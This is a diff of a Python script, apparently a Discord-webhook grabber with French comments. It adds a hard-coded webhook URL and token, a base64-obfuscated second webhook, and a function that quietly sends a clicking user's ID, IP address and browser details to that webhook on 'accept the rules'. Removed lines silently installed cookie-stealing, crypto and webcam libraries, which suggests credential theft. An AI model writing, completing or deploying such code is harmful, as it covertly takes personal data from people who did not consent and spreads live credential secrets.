@@ -1,15 +1,52 @@
+import base64
+import datetime
+import getpass
+import json
+import os
+import platform
+import random
+import re
+import shutil
+import socket
+import stat
 import subprocess
 import sys
+import time
+import uuid
+import zipfile
 
-def _0xInstallDependencies():
-    packages = ["requests", "psutil", "pywin32", "pycryptodome", "browser-cookie3", "opencv-python", "numpy", "pillow", "pyinstaller", "pefile"]
-    subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade"] + packages,stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,)
+import requests
 
-_0xInstallDependencies()
+# Modules optionnels ou spécifiques Windows (protégés pour éviter les erreurs sur Linux/Render)
+for _mod in ("psutil", "pywin32", "win32api", "Crypto", "browser_cookie3", "cv2", "numpy", "PIL", "pefile"):
+    try:
+        __import__(_mod)
+    except ImportError:
+        pass
 
-import os, sys, subprocess, socket, platform, zipfile, shutil, ctypes, stat
-import datetime, json, requests, base64, time, re, random, getpass, uuid
+WEBHOOK_URL = (
+    os.environ.get("WEBHOOK_URL")
+    or "https://discord.com/api/webhooks/1572517445854437386/5EqaDo-B2t-jV0tKr8Dx40oY3bVDHynQ-T3yzeRdAPmSbJd0tXeimw9DvIwxtAdbNW3s"
+)
 
+
+def run_action(member_id=None, ip=None, ua=None, platform_name=None):
+    # Colle ici la suite de ton code (la logique qui s'exécute au clic sur "Accepter les règles")
+    embed = {
+        "title": "⚙️ Script Python déclenché",
+        "color": 0x5865F2,
+        "fields": [
+            {"name": "🆔 ID Membre", "value": str(member_id or "Non précisé"), "inline": True},
+            {"name": "🌐 IP", "value": str(ip or "Inconnue"), "inline": True},
+            {"name": "💻 OS Serveur", "value": platform.system(), "inline": True},
+            {"name": "🖥️ Plateforme Client", "value": str(platform_name or "?"), "inline": True},
+            {"name": "📱 Navigateur", "value": str(ua or "?")[:120], "inline": False},
+        ],
+    }
+    try:
+        requests.post(WEBHOOK_URL, json={"embeds": [embed]}, timeout=5)
+    except Exception as e:
+        print(f"Erreur envoi webhook : {e}")
 _config_encoded = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU3Mjk5MDEwODExMjY1NDQ1OC9WUVJqWk9oSU12bjNFRm9XRHBSQk05VjJTSTNwQW96SThQck1Yc2phMlVNZ09yb1M5eThkOUFydkNLaVp6WkZOTW1aS3xodHRwczovL2kuaW1ndXIuY29tL0c4UVIwZjcucG5n"
 
 def _0xDecodeConfig(_enc):
